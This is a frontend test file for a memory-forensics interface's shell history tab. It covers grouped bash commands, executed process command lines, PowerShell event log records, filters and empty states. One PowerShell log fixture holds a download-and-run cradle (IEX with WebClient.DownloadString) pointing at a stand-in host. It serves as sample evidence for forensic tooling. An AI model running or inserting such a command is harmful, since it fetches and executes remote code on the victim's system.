/** @vitest-environment jsdom */
import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import { fireEvent, render, screen, waitFor } from "@testing-library/react";
import { beforeEach, describe, expect, it, vi } from "vitest";
import type { MemoryActiveResult, MemoryPlatformResultViews } from "../../api/client";
import { MemoryShellHistoryTab } from "./MemoryShellHistoryTab";

const getMemoryActiveResultMock = vi.fn();
const getCommandLineHistoryMock = vi.fn();

const getMemoryPowerShellLogMock = vi.fn();
const getMemoryFindEvilProcessesMock = vi.fn();

vi.mock("../../api/client", () => ({
  api: {
    getMemoryFindEvilProcesses: (...args: unknown[]) => getMemoryFindEvilProcessesMock(...args),
    getMemoryActiveResult: (...args: unknown[]) => getMemoryActiveResultMock(...args),
    getCommandLineHistory: (...args: unknown[]) => getCommandLineHistoryMock(...args),
    getMemoryPowerShellLog: (...args: unknown[]) => getMemoryPowerShellLogMock(...args),
  },
}));

function commandLines(items: Array<Record<string, unknown>>, selectedRun: { id: string; profile: string; status: string } | null = { id: "run-p", profile: "processes_basic", status: "completed" }) {
  return { items, total: items.length, page: 1, page_size: 50, sort_order: "oldest_first", selected_run: selectedRun, contributing_runs: [], coverage: { entities_with_command_lines: items.length, total_entities: items.length, unknown_timestamps: 0 } };
}

const CASE = "case-1";
const EVIDENCE = "ev-1";

function activeResult(overrides: Partial<MemoryActiveResult> = {}): MemoryActiveResult {
  return {
    case_id: CASE,
    evidence_id: EVIDENCE,
    artifact_family: "shell_history",
    active_run: null,
    latest_attempt: null,
    selection_reason: "not_analyzed",
    using_fallback: false,
    historical_override: false,
    total: 0,
    items: [],
    page: 1,
    page_size: 50,
    count_source: null,
    analysis_state: "not_analyzed",
    ...overrides,
  };
}

function renderTab(resultViews: MemoryPlatformResultViews | null = null) {
  const qc = new QueryClient({ defaultOptions: { queries: { retry: false, refetchOnWindowFocus: false } } });
  return render(
    <QueryClientProvider client={qc}>
      <MemoryShellHistoryTab caseId={CASE} evidenceId={EVIDENCE} runOptions={null} selectedRunId={null} onSelectRunId={() => {}} resultViews={resultViews} />
    </QueryClientProvider>,
  );
}

describe("MemoryShellHistoryTab", () => {
  beforeEach(() => {
    getMemoryPowerShellLogMock.mockReset();
    getMemoryPowerShellLogMock.mockResolvedValue({ items: [], total: 0, page: 1, page_size: 50 });
    vi.clearAllMocks();
    getCommandLineHistoryMock.mockResolvedValue(commandLines([], null));
    getMemoryFindEvilProcessesMock.mockResolvedValue({ processes: [] });
  });

  describe("typed duplicates, filters and Find Evil marks", () => {
    const bashRows = [
      { document_id: "d1", pid: 4453, process_name: "bash", command: "sudo apt update", command_time: "2024-07-03T19:40:49Z", source_plugin: "linux.bash", occurrences: 2, pids: [4453, 4954], sources: ["linux.bash"] },
    ];

    it("groups duplicates by default and says how many were recovered", async () => {
      getMemoryActiveResultMock.mockResolvedValue({
        ...activeResult({ analysis_state: "analyzed_with_results", total: 1, items: bashRows as unknown as MemoryActiveResult["items"] }),
        grouped: true,
        ungrouped_total: 2,
        dated_counts: { dated: 2, undated: 0 },
      });
      renderTab();
      const row = await screen.findByTestId("shell-history-row");
      expect(row).toHaveTextContent("4453, 4954");
      expect(screen.getByTestId("shell-history-occurrences")).toHaveTextContent("×2");
      expect(screen.getByTestId("shell-history-summary")).toHaveTextContent("2 recovered");
      expect(getMemoryActiveResultMock).toHaveBeenLastCalledWith(CASE, EVIDENCE, "shell_history", undefined, expect.objectContaining({ group_duplicates: true }));
      // Every command has a time and there is no user: those filters are not offered.
      expect(screen.queryByTestId("shell-history-dated-select")).not.toBeInTheDocument();
      expect(screen.queryByTestId("shell-history-user-select")).not.toBeInTheDocument();
      fireEvent.click(screen.getByTestId("shell-history-group-duplicates"));
      await waitFor(() => expect(getMemoryActiveResultMock).toHaveBeenLastCalledWith(CASE, EVIDENCE, "shell_history", undefined, expect.objectContaining({ group_duplicates: undefined })));
    });

    it("offers user and time filters when the data varies", async () => {
      getMemoryActiveResultMock.mockResolvedValue({
        ...activeResult({ analysis_state: "analyzed_with_results", total: 1, items: bashRows as unknown as MemoryActiveResult["items"] }),
        facets: { user: [{ value: "root", count: 3 }, { value: "bob", count: 1 }] },
        dated_counts: { dated: 3, undated: 1 },
      });
      renderTab();
      fireEvent.change(await screen.findByTestId("shell-history-user-select"), { target: { value: "bob" } });
      await waitFor(() => expect(getMemoryActiveResultMock).toHaveBeenLastCalledWith(CASE, EVIDENCE, "shell_history", undefined, expect.objectContaining({ user: "bob" })));
      fireEvent.change(screen.getByTestId("shell-history-dated-select"), { target: { value: "undated" } });
      await waitFor(() => expect(getMemoryActiveResultMock).toHaveBeenLastCalledWith(CASE, EVIDENCE, "shell_history", undefined, expect.objectContaining({ dated: "undated" })));
    });

    it("marks commands whose process Find Evil flagged", async () => {
      getMemoryFindEvilProcessesMock.mockResolvedValue({ processes: [{ triage_id: "t", pid: 4954, process_name: "bash", indicator_count: 2, priority_counts: { high: 1, medium: 1, low: 0 }, top_priority: "high", indicator_types: [], marking: null }] });
      getMemoryActiveResultMock.mockResolvedValue(activeResult({ analysis_state: "analyzed_with_results", total: 1, items: bashRows as unknown as MemoryActiveResult["items"] }));
      renderTab();
      expect(await screen.findByTestId("shell-history-findevil")).toHaveTextContent("Find Evil · high");
    });
  });

  it("filters commands executed by start time", async () => {
    getMemoryActiveResultMock.mockResolvedValue(activeResult({ analysis_state: "analyzed_empty", selection_reason: "latest_completed" }));
    getCommandLineHistoryMock.mockResolvedValue(commandLines([{ process_entity_id: "p1", pid: 2164, ppid: 4744, process_name: "DumpIt.exe", command_line: "DumpIt.exe", create_time: "2025-03-07T19:41:23+00:00", exit_time: null, timestamp_source: "process_creation_time", visibility: { listed: true }, source_plugins: [], source_observations: [], parent_entity_id: null, findings: [], record_refs: [] }]));
    renderTab();
    fireEvent.click(await screen.findByTestId("shell-history-source-tab-executed"));
    fireEvent.change(await screen.findByTestId("shell-history-launched-from"), { target: { value: "2025-03-07T19:40" } });
    fireEvent.change(screen.getByTestId("shell-history-launched-to"), { target: { value: "2025-03-07T19:45" } });
    await waitFor(() =>
      expect(getCommandLineHistoryMock).toHaveBeenLastCalledWith(CASE, expect.objectContaining({ time_from: "2025-03-07T19:40", time_to: "2025-03-07T19:45:59" })),
    );
  });

  it("lists the command line of every process as commands executed", async () => {
    getMemoryActiveResultMock.mockResolvedValue(activeResult({ analysis_state: "analyzed_empty", selection_reason: "latest_completed" }));
    getCommandLineHistoryMock.mockResolvedValue(
      commandLines([
        { process_entity_id: "p1", pid: 2164, ppid: 4744, process_name: "DumpIt.exe", command_line: "\"C:\\Users\\bob\\Desktop\\DumpIt.exe\"", create_time: "2025-03-07T19:41:23+00:00", exit_time: null, timestamp_source: "process_creation_time", visibility: { listed: true }, source_plugins: [], source_observations: [], parent_entity_id: null, findings: [], record_refs: [] },
        { process_entity_id: "p2", pid: 6372, ppid: 1376, process_name: "taskhostw.exe", command_line: "taskhostw.exe", create_time: "2025-03-07T19:39:44+00:00", exit_time: "2025-03-07T19:39:44+00:00", timestamp_source: "process_creation_time", visibility: { scan_only: true, terminated: true }, source_plugins: [], source_observations: [], parent_entity_id: null, findings: [], record_refs: [] },
      ]),
    );
    renderTab();
    const rows = await screen.findAllByTestId("shell-history-launched-row");
    expect(rows).toHaveLength(2);
    expect(rows[0]).toHaveTextContent("DumpIt.exe");
    expect(rows[0]).toHaveTextContent("2025-03-07 19:41:23");
    expect(rows[1]).toHaveTextContent("Exited");
    expect(getCommandLineHistoryMock).toHaveBeenCalledWith(CASE, expect.objectContaining({ evidence_id: EVIDENCE, sort_order: "oldest_first" }));
  });

  it("asks for the Processes analysis when no process run exists", async () => {
    getMemoryActiveResultMock.mockResolvedValue(activeResult({ analysis_state: "not_analyzed" }));
    renderTab();
    expect(await screen.findByTestId("shell-history-launched-not-analyzed")).toHaveTextContent("Run the Processes analysis");
  });

  it("shows the never-analyzed empty state", async () => {
    getMemoryActiveResultMock.mockResolvedValue(activeResult({ analysis_state: "not_analyzed" }));
    renderTab();
    expect(await screen.findByTestId("shell-history-empty-not-analyzed")).toHaveTextContent("Shell History has not been analyzed yet.");
  });

  it("shows the completed-zero-results empty state, distinct from never-analyzed", async () => {
    getMemoryActiveResultMock.mockResolvedValue(
      activeResult({
        analysis_state: "analyzed_empty",
        active_run: { id: "run-1", profile: "shell_history_basic", status: "completed", started_at: null, completed_at: null },
      }),
    );
    renderTab();
    expect(await screen.findByTestId("shell-history-empty-zero-results")).toHaveTextContent("No typed command was recovered from this memory image");
    expect(screen.queryByTestId("shell-history-empty-not-analyzed")).not.toBeInTheDocument();
  });

  it("shows the failed-run state without claiming 0 results", async () => {
    getMemoryActiveResultMock.mockResolvedValue(
      activeResult({
        analysis_state: "failed",
        latest_attempt: { id: "run-2", profile: "shell_history_basic", status: "failed", started_at: null, completed_at: null },
      }),
    );
    renderTab();
    expect(await screen.findByTestId("shell-history-empty-failed")).toBeInTheDocument();
    expect(screen.queryByTestId("shell-history-empty-zero-results")).not.toBeInTheDocument();
    expect(screen.queryByTestId("shell-history-table")).not.toBeInTheDocument();
  });

  it("renders Time, PID, Process, Command columns with real rows", async () => {
    getMemoryActiveResultMock.mockResolvedValue(
      activeResult({
        analysis_state: "analyzed_with_results",
        total: 2,
        items: [
          { document_id: "d1", pid: 1234, process_name: "bash", command: "sudo apt update", command_time: "2024-03-22T10:53:00" },
          { document_id: "d2", pid: 5678, process_name: "sh", command: "whoami", command_time: null },
        ],
      }),
    );
    renderTab();
    const table = await screen.findByTestId("shell-history-table");
    expect(table).toHaveTextContent("Time");
    expect(table).toHaveTextContent("PID");
    expect(table).toHaveTextContent("Process");
    expect(table).toHaveTextContent("Command");
    expect(table).toHaveTextContent("1234");
    expect(table).toHaveTextContent("bash");
    expect(table).toHaveTextContent("sudo apt update");
    expect(table).toHaveTextContent("2024-03-22T10:53:00");
  });

  it("a row without a timestamp stays a valid row -- shown as Undated, not blank or fabricated", async () => {
    getMemoryActiveResultMock.mockResolvedValue(
      activeResult({
        analysis_state: "analyzed_with_results",
        total: 1,
        items: [{ document_id: "d1", pid: 42, process_name: "bash", command: "ls -la", command_time: null }],
      }),
    );
    renderTab();
    expect(await screen.findByTestId("shell-history-undated")).toHaveTextContent("Undated");
  });

  it("renders a long command in full, not truncated", async () => {
    const longCommand = "echo " + "A".repeat(400);
    getMemoryActiveResultMock.mockResolvedValue(
      activeResult({
        analysis_state: "analyzed_with_results",
        total: 1,
        items: [{ document_id: "d1", pid: 1, process_name: "bash", command: longCommand, command_time: null }],
      }),
    );
    renderTab();
    const commandCell = await screen.findByTestId("shell-history-command-text");
    expect(commandCell.textContent).toBe(longCommand);
  });

  it("renders Unicode commands correctly", async () => {
    const unicodeCommand = "echo 'héllo wörld 日本語 🚀'";
    getMemoryActiveResultMock.mockResolvedValue(
      activeResult({
        analysis_state: "analyzed_with_results",
        total: 1,
        items: [{ document_id: "d1", pid: 1, process_name: "bash", command: unicodeCommand, command_time: null }],
      }),
    );
    renderTab();
    expect(await screen.findByTestId("shell-history-command-text")).toHaveTextContent(unicodeCommand);
  });

  it("PID is rendered as a plain numeric value", async () => {
    getMemoryActiveResultMock.mockResolvedValue(
      activeResult({
        analysis_state: "analyzed_with_results",
        total: 1,
        items: [{ document_id: "d1", pid: 9999, process_name: "bash", command: "id", command_time: null }],
      }),
    );
    renderTab();
    const table = await screen.findByTestId("shell-history-table");
    expect(table).toHaveTextContent("9999");
  });

  it("does not render invented columns (User, CWD, TTY, Session)", async () => {
    getMemoryActiveResultMock.mockResolvedValue(
      activeResult({
        analysis_state: "analyzed_with_results",
        total: 1,
        items: [{ document_id: "d1", pid: 1, process_name: "bash", command: "id", command_time: null }],
      }),
    );
    renderTab();
    const table = await screen.findByTestId("shell-history-table");
    for (const invented of ["User", "CWD", "TTY", "Session"]) {
      expect(table).not.toHaveTextContent(new RegExp(`^${invented}$`));
    }
  });

  it("queries the shell_history family with the evidence id and case id", async () => {
    getMemoryActiveResultMock.mockResolvedValue(activeResult());
    renderTab();
    await waitFor(() => expect(getMemoryActiveResultMock).toHaveBeenCalled());
    const [caseId, evidenceId, family] = getMemoryActiveResultMock.mock.calls[0];
    expect(caseId).toBe(CASE);
    expect(evidenceId).toBe(EVIDENCE);
    expect(family).toBe("shell_history");
  });
  it("shows where a Windows command came from and its working directory", async () => {
    getMemoryActiveResultMock.mockResolvedValue(
      activeResult({
        analysis_state: "analyzed_with_results",
        active_run: { id: "run-3", profile: "shell_history_basic", status: "completed", started_at: null, completed_at: null },
        total: 2,
        items: [
          { document_id: "d1", pid: 5404, process_name: "powershell.EXE", command: ".\\tool.exe", working_directory: "C:\\Users\\admin\\Desktop", recovered_from: "screen" },
          { document_id: "d2", pid: 88, process_name: "cmd.exe", command: "whoami", working_directory: null, recovered_from: "command_history" },
        ] as unknown as MemoryActiveResult["items"],
      }),
    );
    renderTab();
    await waitFor(() => expect(screen.getAllByTestId("shell-history-row")).toHaveLength(2));
    expect(screen.getAllByTestId("shell-history-source").map((cell) => cell.textContent)).toEqual(["Console screen", "Console history"]);
    expect(screen.getAllByTestId("shell-history-directory").map((cell) => cell.textContent)).toEqual(["C:\\Users\\admin\\Desktop", "—"]);
  });
  it("names the user and file for commands from a PowerShell history file", async () => {
    const historyFile = "\\Users\\bob\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt";
    getMemoryActiveResultMock.mockResolvedValue(
      activeResult({
        analysis_state: "analyzed_with_results",
        active_run: { id: "run-4", profile: "shell_history_basic", status: "completed", started_at: null, completed_at: null },
        total: 1,
        items: [
          { document_id: "d3", pid: null, process_name: "powershell.exe", command: "Get-LocalUser", recovered_from: "psreadline_history", user: "bob", history_file: historyFile },
        ] as unknown as MemoryActiveResult["items"],
      }),
    );
    renderTab();
    await waitFor(() => expect(screen.getAllByTestId("shell-history-row")).toHaveLength(1));
    const source = screen.getByTestId("shell-history-source");
    expect(source.textContent).toBe("PowerShell history filebob");
    expect(source.getAttribute("title")).toBe(historyFile);
  });
  it("lists PowerShell event log records with their time, event and script block part", async () => {
    getMemoryActiveResultMock.mockResolvedValue(activeResult());
    getMemoryPowerShellLogMock.mockResolvedValue({
      items: [
        { id: "p1", timestamp: "2025-03-07T19:40:01Z", event_id: 4104, channel: "Microsoft-Windows-PowerShell/Operational", pid: 5404, command: "IEX (New-Object Net.WebClient).DownloadString('http://x/a.ps1')", part: "1/2" },
        { id: "p2", timestamp: "2025-03-07T19:40:05Z", event_id: 800, channel: "Windows PowerShell", pid: null, command: "Get-LocalUser", host_application: "powershell.exe" },
      ],
      total: 2,
      page: 1,
      page_size: 50,
    });
    renderTab();
    await waitFor(() => expect(screen.getAllByTestId("shell-history-powershell-row")).toHaveLength(2));
    const rows = screen.getAllByTestId("shell-history-powershell-row");
    expect(rows[0].textContent).toContain("2025-03-07 19:40:01");
    expect(rows[0].textContent).toContain("4104");
    expect(rows[0].textContent).toContain("part 1/2");
    expect(rows[1].textContent).toContain("Get-LocalUser");
    expect(getMemoryPowerShellLogMock.mock.calls[0].slice(0, 2)).toEqual([CASE, EVIDENCE]);
  });

  it("says when no PowerShell record was found", async () => {
    getMemoryActiveResultMock.mockResolvedValue(activeResult());
    renderTab();
    expect((await screen.findByTestId("shell-history-powershell-empty")).textContent).toContain("Find Evil");
  });

  describe("sources", () => {
    const typedRow = { document_id: "d1", pid: 10, process_name: "bash", command: "ls -la", source_plugin: "linux.bash" };

    it("shows each source's count and opens the first one with records", async () => {
      getMemoryActiveResultMock.mockResolvedValue(activeResult({ analysis_state: "analyzed_empty", total: 0 }));
      getCommandLineHistoryMock.mockResolvedValue(commandLines([{ process_entity_id: "p1", pid: 4, ppid: 1, process_name: "cmd.exe", command_line: "cmd /c whoami", create_time: null, visibility: { listed: true } }]));
      renderTab();

      await waitFor(() => expect(screen.getByTestId("shell-history-source-count-executed")).toHaveTextContent("1"));
      expect(screen.getByTestId("shell-history-source-count-typed")).toHaveTextContent("0");
      await waitFor(() => expect(screen.getByTestId("shell-history-source-tab-executed")).toHaveAttribute("aria-selected", "true"));
      expect(screen.getByTestId("shell-history-launched").closest("[hidden]")).toBeNull();
      expect(screen.getByTestId("shell-history-typed").closest("[hidden]")).not.toBeNull();
    });

    it("keeps the analyst's choice", async () => {
      getMemoryActiveResultMock.mockResolvedValue(activeResult({ analysis_state: "analyzed_empty", total: 0 }));
      getCommandLineHistoryMock.mockResolvedValue(commandLines([{ process_entity_id: "p1", pid: 4, ppid: 1, process_name: "cmd.exe", command_line: "x", create_time: null, visibility: {} }]));
      renderTab();
      await waitFor(() => expect(screen.getByTestId("shell-history-source-tab-executed")).toHaveAttribute("aria-selected", "true"));

      fireEvent.click(screen.getByTestId("shell-history-source-tab-typed"));

      expect(screen.getByTestId("shell-history-source-tab-typed")).toHaveAttribute("aria-selected", "true");
    });

    it("does not offer PowerShell's event log where MemProcFS cannot run", async () => {
      getMemoryActiveResultMock.mockResolvedValue(activeResult());
      renderTab({ presentation_families: ["memory_shell_history"], frameworks: ["volatility3"] } as unknown as MemoryPlatformResultViews);

      await screen.findByTestId("shell-history-source-tab-typed");
      expect(screen.queryByTestId("shell-history-source-tab-powershell")).not.toBeInTheDocument();
      expect(screen.queryByTestId("shell-history-powershell-log")).not.toBeInTheDocument();
      expect(getMemoryPowerShellLogMock).not.toHaveBeenCalled();
    });

    it("offers only the sources present in the data and sends the typed filters", async () => {
      getMemoryActiveResultMock.mockResolvedValue({
        ...activeResult({ analysis_state: "analyzed_with_results", total: 1, items: [typedRow] }),
        source_facets: [{ value: "linux.bash", count: 3 }, { value: "screen", count: 1 }],
      });
      renderTab();

      const select = await screen.findByTestId("shell-history-source-select");
      const options = Array.from(select.querySelectorAll("option")).map((o) => o.textContent);
      expect(options).toEqual(["All sources", "Bash history (3)", "Console screen (1)"]);
      expect(screen.getByTestId("shell-history-source")).toHaveTextContent("Bash history");

      fireEvent.change(select, { target: { value: "linux.bash" } });
      fireEvent.change(screen.getByTestId("shell-history-command-input"), { target: { value: "curl" } });

      await waitFor(() =>
        expect(getMemoryActiveResultMock).toHaveBeenLastCalledWith(
          CASE, EVIDENCE, "shell_history", undefined,
          expect.objectContaining({ source: "linux.bash", command: "curl", page: 1 }),
        ),
      );
    });

    it("hides the source filter when the data has a single source", async () => {
      getMemoryActiveResultMock.mockResolvedValue({
        ...activeResult({ analysis_state: "analyzed_with_results", total: 1, items: [typedRow] }),
        source_facets: [{ value: "linux.bash", count: 1 }],
      });
      renderTab();

      await screen.findByTestId("shell-history-command-input");
      expect(screen.queryByTestId("shell-history-source-select")).not.toBeInTheDocument();
    });

    it("sends the executed-command filters the backend supports", async () => {
      getMemoryActiveResultMock.mockResolvedValue(activeResult());
      getCommandLineHistoryMock.mockResolvedValue(commandLines([{ process_entity_id: "p1", pid: 4, ppid: 1, process_name: "cmd.exe", command_line: "x", create_time: null, visibility: {} }]));
      renderTab();
      await screen.findByTestId("shell-history-launched-table");
      expect(getCommandLineHistoryMock).toHaveBeenLastCalledWith(CASE, expect.objectContaining({ group_identical: true }));

      fireEvent.click(screen.getByTestId("shell-history-launched-grouped"));
      fireEvent.change(screen.getByTestId("shell-history-launched-state"), { target: { value: "terminated" } });
      fireEvent.change(screen.getByTestId("shell-history-launched-ppid"), { target: { value: "1" } });
      fireEvent.change(screen.getByTestId("shell-history-launched-order"), { target: { value: "newest_first" } });

      await waitFor(() =>
        expect(getCommandLineHistoryMock).toHaveBeenLastCalledWith(
          CASE,
          expect.objectContaining({ visibility: "terminated", ppid: 1, sort_order: "newest_first", group_identical: undefined, page: 1 }),
        ),
      );
    });
  });

  it("groups command lines that differ only in numbers, with their count and variants", async () => {
    getMemoryActiveResultMock.mockResolvedValue(activeResult());
    getCommandLineHistoryMock.mockResolvedValue({
      ...commandLines([
        { process_entity_id: "p1", pid: 21, ppid: 2, process_name: "kworker/0:1", command_line: "[kworker/0:1]", create_time: null, visibility: {}, count: 33, variants: 33, pids: [21, 22, 23, 24, 25, 26], process_names: ["kworker/0:1"], first_start: null },
      ]),
      grouped: true,
    });
    renderTab();

    const row = await screen.findByTestId("shell-history-launched-group-row");
    expect(row).toHaveTextContent("33");
    expect(row).toHaveTextContent("21, 22, 23, 24, 25 +1");
    expect(screen.getByTestId("shell-history-launched-variants")).toHaveTextContent("33 variants");
  });
});
